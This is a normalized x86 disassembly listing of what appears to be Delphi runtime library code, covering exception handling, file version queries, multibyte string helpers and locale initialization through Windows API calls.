push sub_40ba28
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
push eax
lea edx [ ebp - 0x8 ]
mov eax esi
call sub_405e60
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
call sub_408f58
mov edx [ ebp - 0x4 ]
lea eax [ edi + 0x4 ]
call sub_403fc0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ba2f
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403f90
retn
add esp 0xfffffff0
call sub_403540
sub_40ba2f
mov eax edi
test bl bl
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40ba50
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
lea eax [ edi + 0x4 ]
mov edx esi
call sub_403fc0
mov eax [ ebp + 0x8 ]
mov [ edi + 0x8 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403540
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403598
pop [ fs : 0x0 ]
add esp 0xc
sub_40bac4
push ebx
push esi
add esp 0xfffffff8
xor ebx ebx
call sub_402968
mov esi eax
jmp r-xdata
cmp ebx 0x6
jg r-xdata
cmp ebx 0x6
jg r-xdata
cmp esi [ ebx * 8 + rw-data ]
jne r-xdata
mov [ esp ] esi
mov [ esp + 0x4 ] 0x0
push esp
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b9bc
mov ecx [ ebx * 8 + rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b8c4
jmp r-xdata
inc ebx
mov [ eax + 0xc ] esi
pop ecx
pop edx
pop esi
pop ebx
retn
sub_40bb24
sub [ ebx + 0xa0e0040 ] bh
push esp
inc ebp
js r-xdata
jle r-xdata
jo r-xdata
[ ebx - 0x3d ]
mov eax eax
loopne r-xdata
push edx
je r-xdata
pop ebp
cld
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bc34
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov edx [ rw-data ]
jmp r-xdata
dec dl
je r-xdata
pop es
arpl [ gs : eax ] cx
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add ah cl
adc [ eax ] al
add al 0x0
add [ eax ] al
push ebx
mov ebx edx
mov edx eax
dec dl
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404004
jmp r-xdata
push ebx
mov eax edx
jmp sub_4039a8
mov edx [ rw-data ]
jmp r-xdata
dec edx
sub dl 0x16
jb r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc3b
lea eax [ ebp - 0x20 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
and eax 0xff
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b8c4
mov edx eax
jmp r-xdata
jmp r-xdata
call sub_40bac4
mov edx eax
sub_40bb98
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40bc34
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
lea eax [ ebp - 0x4 ]
mov edx ebx
call sub_404004
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x18 ] 0xb
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0xb
mov [ ebp - 0xc ] edi
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0x1c ]
push eax
push 0x2
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bc3b
lea eax [ ebp - 0x20 ]
call sub_403f6c
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40bc88
mov eax [ eax ]
cmp eax 0xc0000092
jg r-xdata
cmp eax 0xc0000096
jg r-xdata
je r-xdata
sub eax 0xc00000fd
je r-xdata
je r-xdata
mov al 0x6
retn
cmp eax 0xc000008e
jg r-xdata
mov al 0xe
retn
sub eax 0x3d
je r-xdata
mov al 0xc
retn
sub eax 0xc0000093
je r-xdata
add eax 0x3fffff71
sub eax 0x2
jb r-xdata
je r-xdata
mov al 0xd
retn
jmp r-xdata
mov al 0x9
retn
dec eax
je r-xdata
je r-xdata
mov al 0x7
retn
sub eax 0xc0000005
je r-xdata
mov al 0x16
retn
mov al 0x3
retn
dec eax
je r-xdata
mov al 0x8
retn
jmp r-xdata
mov al 0xb
retn
sub eax 0x87
je r-xdata
mov al 0x5
retn
jmp r-xdata
mov al 0x4
retn
dec eax
je r-xdata
jmp r-xdata
sub_40bd20
push ebp
mov ebp esp
add esp 0xfffffe90
push ebx
push esi
xor eax eax
mov [ ebp - 0x170 ] eax
mov [ ebp - 0x14c ] eax
mov [ ebp - 0x154 ] eax
mov [ ebp - 0x150 ] eax
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bedb
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov ebx [ eax - 0x4 ]
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405e60
jmp r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x16c ] eax
mov [ ebp - 0x168 ] 0x5
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x164 ] eax
mov [ ebp - 0x160 ] 0xb
mov [ ebp - 0x15c ] esi
mov [ ebp - 0x158 ] 0x5
lea eax [ ebp - 0x16c ]
push eax
push 0x2
lea edx [ ebp - 0x170 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x170 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
mov ebx eax
push 0x105
lea eax [ ebp - 0x125 ]
push eax
mov eax [ ebp - 0x1c ]
push eax
call GetModuleFileNameA
test eax eax
je r-xdata
mov esi [ ebx + 0x18 ]
push 0x1c
lea eax [ ebp - 0x20 ]
push eax
mov eax [ ebx + 0xc ]
push eax
call VirtualQuery
cmp [ ebp - 0x10 ] 0x1000
jne r-xdata
mov eax [ ebx + 0xc ]
mov [ ebp - 0x148 ] eax
mov [ ebp - 0x144 ] 0x5
lea eax [ ebp - 0x150 ]
lea edx [ ebp - 0x125 ]
mov ecx 0x105
call sub_4041dc
mov eax [ ebp - 0x150 ]
lea edx [ ebp - 0x14c ]
call sub_408760
mov eax [ ebp - 0x14c ]
mov [ ebp - 0x140 ] eax
mov [ ebp - 0x13c ] 0xb
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x138 ] eax
mov [ ebp - 0x134 ] 0xb
mov [ ebp - 0x130 ] esi
mov [ ebp - 0x12c ] 0x5
lea eax [ ebp - 0x148 ]
push eax
push 0x3
lea edx [ ebp - 0x154 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x154 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bee2
lea eax [ ebp - 0x170 ]
call sub_403f6c
lea eax [ ebp - 0x154 ]
mov edx 0x3
call sub_403f90
lea eax [ ebp - 0x4 ]
call sub_403f6c
retn
sub_40beec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
xor edx edx
mov [ ebp - 0x10 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_40bfa7
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_40bc88
and eax 0xff
mov edx eax
add edx 0xfffffffd
sub edx 0x8
jb r-xdata
lea eax [ eax * 8 + rw-data ]
mov ecx [ eax + 0x4 ]
mov eax [ eax ]
mov dl 0x1
call sub_40b8c4
mov ebx eax
jmp r-xdata
je r-xdata
mov eax ebx
mov edx [ r-xdata ]
call sub_4033a8
test al al
je r-xdata
push ebp
call sub_40bd20
pop ecx
mov ebx eax
jmp r-xdata
dec edx
sub edx 0xa
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40bfae
lea eax [ ebp - 0x10 ]
call sub_403f6c
retn
mov eax [ ebp - 0x4 ]
mov [ ebx + 0xc ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
lea eax [ ebp - 0xc ]
push eax
push 0x0
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405e60
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b900
mov ebx eax
sub_40bfc8
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
mov [ rw-data ] eax
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b980
mov [ rw-data ] eax
mov eax [ rw-data ]
mov [ eax ] r-xdata
mov eax [ rw-data ]
mov [ eax ] sub_40bfb8
mov eax [ rw-data ]
mov edx [ r-xdata ]
mov [ eax ] edx
mov eax [ rw-data ]
mov [ eax ] sub_40bd08
mov eax [ rw-data ]
mov [ eax ] sub_40beec
mov eax sub_40bc54
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40bc70
mov edx [ rw-data ]
mov [ edx ] eax
retn
sub_40c04c
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx - 0x8 ]
xor eax eax
mov [ rw-data ] eax
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
mov eax [ rw-data ]
xor edx edx
mov [ eax ] edx
retn
mov eax [ rw-data ]
mov [ eax + 0xc ] 0x1
mov eax [ rw-data ]
call sub_40321c
xor eax eax
mov [ rw-data ] eax
sub_40c0cc
add esp 0xffffff6c
mov [ esp ] 0x94
push esp
call GetVersionExA
test eax eax
je r-xdata
add esp 0x94
retn
mov eax [ esp + 0x10 ]
mov [ rw-data ] eax
mov eax [ esp + 0x4 ]
mov [ rw-data ] eax
mov eax [ esp + 0x8 ]
mov [ rw-data ] eax
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ esp + 0xc ]
mov [ rw-data ] eax
mov eax [ esp + 0xc ]
and eax 0xffff
mov [ rw-data ] eax
jmp r-xdata
mov eax rw-data
lea edx [ esp + 0x14 ]
mov ecx 0x80
call sub_4041dc
sub_40c15c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
xor edx edx
mov [ ebp - 0x8 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_40c232
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x4 ] 0xffffffff
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404004
lea eax [ ebp - 0x8 ]
call j_sub_404438
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40442c
push eax
call GetFileVersionInfoSizeA
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c239
lea eax [ ebp - 0x8 ]
call sub_403f6c
retn
mov eax ebx
call sub_40278c
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_40c215
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x10 ]
push eax
push ebx
mov eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
call sub_40442c
push eax
call GetFileVersionInfoA
test eax eax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x10 ]
call sub_4027ac
retn
lea eax [ ebp - 0x18 ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push r-xdata
mov eax [ ebp - 0x10 ]
push eax
call VerQueryValueA
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x4 ] eax
sub_40c248
push esi
push edi
mov edi edx
xor edx edx
test eax eax
je r-xdata
mov eax edx
pop edi
pop esi
retn
cmp [ eax + edi ] 0x0
je r-xdata
test edi edi
jne r-xdata
mov esi edi
dec esi
jmp r-xdata
mov al [ eax ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
test esi esi
jl r-xdata
mov dl 0x1
jmp r-xdata
mov ecx edi
sub ecx esi
and ecx 0x80000001
jns r-xdata
mov cl [ eax + esi ]
and ecx 0xff
bt [ rw-data ] ecx
jb r-xdata
test ecx ecx
jne r-xdata
dec ecx
or ecx 0xfffffffe
inc ecx
dec esi
mov al [ eax + edi ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov dl 0x2
jmp r-xdata
mov dl 0x1
sub_40c2c0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_40442c
mov edx esi
dec edx
call sub_40c248
sub_40c2fc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40422c
cmp esi eax
jle r-xdata
mov edx esi
mov eax ebx
call sub_40c324
pop esi
pop ebx
retn
mov eax ebx
call sub_40422c
mov esi eax
sub_40c324
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor edi edi
test esi esi
jle r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_40422c
cmp esi eax
jg r-xdata
mov edi esi
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
xor edi edi
cmp esi eax
jl r-xdata
mov dl [ ebx + eax - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
inc eax
mov edx eax
mov eax ebx
call sub_40c534
jmp r-xdata
inc edi
cmp esi eax
jge r-xdata
sub_40c37c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax edi
call sub_40422c
mov [ ebp - 0xc ] eax
mov esi 0x1
mov ebx 0x1
jmp r-xdata
cmp ebx [ ebp - 0xc ]
jge r-xdata
cmp esi [ ebp - 0x4 ]
jne r-xdata
cmp esi [ ebp - 0x4 ]
jl r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] esi
mov eax [ ebp + 0x8 ]
mov [ eax ] ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp ebx [ ebp - 0xc ]
jge r-xdata
inc esi
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov al [ edi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
inc ebx
mov edx ebx
mov eax edi
call sub_40c534
mov ebx eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_40c534
dec eax
mov ebx eax
sub_40c40c
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40422c
cmp ebx eax
jg r-xdata
cmp ebx 0x1
jle r-xdata
mov [ esp ] ebx
cmp [ rw-data ] 0x0
je r-xdata
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
dec edx
mov eax esi
call sub_40c37c
dec ebx
cmp ebx [ esp + 0x4 ]
jg r-xdata
xor eax eax
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_40422c
cmp eax [ esp ]
jg r-xdata
inc [ esp ]
jmp r-xdata
sub_40c470
push ebx
push esi
add esp 0xfffffff8
mov ebx edx
mov esi eax
xor eax eax
mov [ esp ] eax
test ebx ebx
jle r-xdata
mov eax [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_40422c
cmp ebx eax
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax esi
call sub_40422c
mov ebx eax
mov [ esp ] ebx
push esp
lea ecx [ esp + 0x8 ]
mov edx ebx
mov eax esi
call sub_40c37c
mov eax esi
call sub_40422c
cmp eax [ esp ]
jge r-xdata
mov eax esi
call sub_40422c
mov [ esp ] eax
jmp r-xdata
sub_40c4f8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x1
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ ebx + esi - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax ebx
call sub_40442c
add eax esi
dec eax
call sub_40c4d0
sub_40c534
push ebx
push esi
mov ebx edx
mov esi eax
lea eax [ ebx + 0x1 ]
cmp [ rw-data ] 0x0
je r-xdata
pop esi
pop ebx
retn
mov dl [ esi + ebx - 0x1 ]
and edx 0xff
bt [ rw-data ] edx
jae r-xdata
mov eax esi
call sub_40442c
add eax ebx
dec eax
call sub_40c4d0
add eax ebx
sub_40c570
push ebx
push esi
push edi
push ebp
mov esi edx
mov ebx eax
xor edi edi
mov eax ebx
call sub_40442c
push eax
mov eax esi
call sub_40442c
mov ebp eax
mov eax ebp
pop edx
call sub_40c634
mov ebx eax
test ebx ebx
je r-xdata
mov eax edi
pop ebp
pop edi
pop esi
pop ebx
retn
mov edi ebx
sub edi ebp
inc edi
sub_40c5a8
push ebx
push esi
push edi
push ebp
mov edi edx
mov esi eax
cmp [ rw-data ] 0x0
je r-xdata
mov edx edi
mov eax esi
call sub_408064
mov eax esi
call sub_40422c
mov ebp eax
mov eax edi
mov edx ebp
call sub_4045b8
mov ebx 0x1
cmp ebp ebx
jl r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
call j_sub_404438#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
mov al [ esi + ebx - 0x1 ]
and eax 0xff
bt [ rw-data ] eax
jae r-xdata
mov eax [ edi ]
mov al [ eax + ebx - 0x1 ]
add al 0xbf
sub al 0x1a
jae r-xdata
inc ebx
mov eax edi
call j_sub_404438#2
mov dl [ esi + ebx - 0x1 ]
mov [ eax + ebx - 0x1 ] dl
jmp r-xdata
inc ebx
cmp ebp ebx
jge r-xdata
mov eax edi
call j_sub_404438#2
add [ eax + ebx - 0x1 ] 0x20
jmp r-xdata
sub_40c634
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebp edx
mov esi eax
xor ebx ebx
test esi esi
je r-xdata
mov eax ebx
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ esi ] 0x0
je r-xdata
test ebp ebp
je r-xdata
cmp [ ebp ] 0x0
je r-xdata
mov eax esi
call sub_408890
mov [ esp ] eax
mov eax ebp
call sub_408890
mov edi eax
mov edx ebp
mov eax esi
call sub_408a28
mov ebx eax
jmp r-xdata
test ebx ebx
je r-xdata
xor ebx ebx
mov eax ebx
sub eax esi
mov edx [ esp ]
sub edx eax
cmp edi edx
jbe r-xdata
mov edx ebx
sub edx esi
mov eax esi
call sub_40c2e4
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x2
je r-xdata
cmp [ esp + 0x4 ] 0x1
jne r-xdata
push edi
push ebp
push edi
push ebx
push 0x0
push 0x400
call CompareStringA
cmp eax 0x2
je r-xdata
inc ebx
mov edx ebp
mov eax ebx
call sub_408a28
mov ebx eax
inc ebx
sub_40c6d4
push ebx
push esi
mov ebx edx
mov edx ebx
call sub_40c6fc
mov esi eax
test bl bl
je r-xdata
mov eax esi
pop esi
pop ebx
retn
test eax eax
je r-xdata
mov esi eax
inc eax
mov edx ebx
call sub_40c6fc
test eax eax
jne r-xdata
sub_40c6fc
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_408a14
mov edi eax
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
retn
mov edx edi
sub edx esi
mov eax esi
call sub_40c2e4
sub al 0x1
jb r-xdata
je r-xdata
inc edi
jmp r-xdata
inc edi
mov edx ebx
mov eax edi
call sub_408a14
mov edi eax
test edi edi
jne r-xdata
sub_40c73c
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
xor edx edx
mov [ ebp - 0xc ] edx
xor edx edx
push ebp
push sub_40c7a0
push [ fs : edx ]
mov [ fs : edx ] esp
push 0x7
lea edx [ ebp - 0x7 ]
push edx
push 0x1004
push eax
call GetLocaleInfoA
lea eax [ ebp - 0xc ]
lea edx [ ebp - 0x7 ]
mov ecx 0x7
call sub_4041dc
mov eax [ ebp - 0xc ]
push eax
call GetACP
mov edx eax
pop eax
call sub_4083b8
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40c7a7
lea eax [ ebp - 0xc ]
call sub_403f6c
retn
sub_40c7b0
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
add edi 0xffffffec
push edi
mov eax [ rw-data ]
call sub_40c73c
push eax
call GetCPInfo
xor esi esi
jmp r-xdata
cmp esi 0xc
jge r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov al [ edi + esi + 0x6 ]
or al [ edi + esi + 0x7 ]
jne r-xdata
mov al [ edi + esi + 0x6 ]
mov bl [ edi + esi + 0x7 ]
sub bl al
jb r-xdata
add esi 0x2
inc ebx
mov [ ebp - 0x1 ] al
mov al [ ebp - 0x1 ]
and eax 0xff
bts [ rw-data ] eax
inc [ ebp - 0x1 ]
dec bl
jne r-xdata
sub_40c828
push ebp
mov ebp esp
add esp 0xfffffe68
push ebx
push esi
push edi
mov [ rw-data ] 0x409
mov [ rw-data ] 0x9
mov [ rw-data ] 0x1
call GetThreadLocale
test eax eax
je r-xdata
test ax ax
je r-xdata
mov [ rw-data ] eax
mov esi r-xdata
mov edi rw-data
mov ecx 0x8
[ edi ] [ esi ]
cmp [ rw-data ] 0x2
jne r-xdata
mov edx eax
and dx 0x3ff
movzx edx dx
mov [ rw-data ] edx
movzx eax ax
shr eax 0xa
mov [ rw-data ] eax
push 0x4a
call GetSystemMetrics
test eax eax
setne al
mov [ rw-data ] al
push 0x2a
call GetSystemMetrics
test eax eax
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
call sub_40c810
test al al
je r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push ebp
call sub_40c7b0
pop ecx
push ebp
call sub_40c7b0
pop ecx
mov eax rw-data
mov edx r-xdata
mov cl 0x20
call sub_402d54
setne bl
mov [ rw-data ] bl
test bl bl
je r-xdata
mov [ rw-data ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
mov eax 0x80
lea edx [ ebp - 0x94 ]
mov [ rw-data ] 0x0
jmp r-xdata
mov [ edx ] al
inc eax
inc edx
cmp eax 0x100
jne r-xdata
lea eax [ ebp - 0x94 ]
lea edx [ ebp - 0x196 ]
push edx
push 0x80
push eax
push 0x2
mov eax [ rw-data ]
push eax
call GetStringTypeExA
mov eax 0x80
lea edx [ ebp - 0x196 ]
add edx 0x2
dec eax
jne r-xdata
cmp [ edx ] 0x2
sete cl
mov [ rw-data ] cl
test cl cl
jne r-xdata
jmp r-xdata
sub_40c99c
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
xor eax eax
push ebp
push sub_40cc67
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_40c828
call sub_40b1ac
cmp [ rw-data ] 0x0
je r-xdata
call GetThreadLocale
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
xor ecx ecx
mov edx 0x14
mov eax ebx
call sub_40b0fc
mov edx [ ebp - 0x10 ]
mov eax rw-data
call sub_403fc0
lea eax [ ebp - 0x14 ]
push eax
mov ecx r-xdata
mov edx 0x1b
mov eax ebx
call sub_40b0fc
mov eax [ ebp - 0x14 ]
xor edx edx
call sub_4083b8
mov [ rw-data ] al
lea eax [ ebp - 0x18 ]
push eax
mov ecx r-xdata
mov edx 0x1c
mov eax ebx
call sub_40b0fc
mov eax [ ebp - 0x18 ]
xor edx edx
call sub_4083b8
mov [ rw-data ] al
mov cl 0x2c
mov edx 0xf
mov eax ebx
call sub_40b148
mov [ rw-data ] al
mov cl 0x2e
mov edx 0xe
mov eax ebx
call sub_40b148
mov [ rw-data ] al
lea eax [ ebp - 0x1c ]
push eax
mov ecx r-xdata
mov edx 0x19
mov eax ebx
call sub_40b0fc
mov eax [ ebp - 0x1c ]
xor edx edx
call sub_4083b8
mov [ rw-data ] al
mov cl 0x2f
mov edx 0x1d
mov eax ebx
call sub_40b148
mov [ rw-data ] al
lea eax [ ebp - 0x24 ]
push eax
mov ecx r-xdata
mov edx 0x1f
mov eax ebx
call sub_40b0fc
mov eax [ ebp - 0x24 ]
lea edx [ ebp - 0x20 ]
call sub_40b434
mov edx [ ebp - 0x20 ]
mov eax rw-data
call sub_403fc0
lea eax [ ebp - 0x2c ]
push eax
mov ecx r-xdata
mov edx 0x20
mov eax ebx
call sub_40b0fc
mov eax [ ebp - 0x2c ]
lea edx [ ebp - 0x28 ]
call sub_40b434
mov edx [ ebp - 0x28 ]
mov eax rw-data
call sub_403fc0
mov cl 0x3a
mov edx 0x1e
mov eax ebx
call sub_40b148
mov [ rw-data ] al
lea eax [ ebp - 0x30 ]
push eax
mov ecx r-xdata
mov edx 0x28
mov eax ebx
call sub_40b0fc
mov edx [ ebp - 0x30 ]
mov eax rw-data
call sub_403fc0
lea eax [ ebp - 0x34 ]
push eax
mov ecx r-xdata
mov edx 0x29
mov eax ebx
call sub_40b0fc
mov edx [ ebp - 0x34 ]
mov eax rw-data
call sub_403fc0
lea eax [ ebp - 0x8 ]
call sub_403f6c
lea eax [ ebp - 0xc ]
call sub_403f6c
lea eax [ ebp - 0x38 ]
push eax
mov ecx r-xdata
mov edx 0x25
mov eax ebx
call sub_40b0fc
mov eax [ ebp - 0x38 ]
xor edx edx
call sub_4083b8
test eax eax
jne r-xdata
call sub_40b384
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
lea eax [ ebp - 0x4 ]
mov edx r-xdata
call sub_404004
jmp r-xdata
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042ec
push [ ebp - 0x8 ]
push [ ebp - 0x4 ]
push r-xdata
push [ ebp - 0xc ]
mov eax rw-data
mov edx 0x4
call sub_4042ec
mov cl 0x2c
mov edx 0xc
mov eax ebx
call sub_40b148
mov [ rw-data ] al
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40cc6e
lea eax [ ebp - 0x40 ]
mov edx 0x10
call sub_403f90
retn
lea eax [ ebp - 0x40 ]
push eax
mov ecx r-xdata
mov edx 0x1005
mov eax ebx
call sub_40b0fc
mov eax [ ebp - 0x40 ]
xor edx edx
call sub_4083b8
test eax eax
jne r-xdata
lea eax [ ebp - 0x3c ]
push eax
mov ecx r-xdata
mov edx 0x23
mov eax ebx
call sub_40b0fc
mov eax [ ebp - 0x3c ]
xor edx edx
call sub_4083b8
test eax eax
jne r-xdata
lea eax [ ebp - 0x8 ]
mov edx r-xdata
call sub_404004
lea eax [ ebp - 0xc ]
mov edx r-xdata
call sub_404004
jmp r-xdata
sub_40cd14
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_40ce37
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0xc ] 0x2
je r-xdata
lea eax [ ebp - 0x8 ]
mov edx ebx
call sub_404004
lea eax [ ebp - 0xc ]
mov edx edi
call sub_404004
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_408030
lea edx [ ebp - 0xc ]
mov eax edi
call sub_408030
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx ebx
call sub_404004
mov eax esi
call sub_403f6c
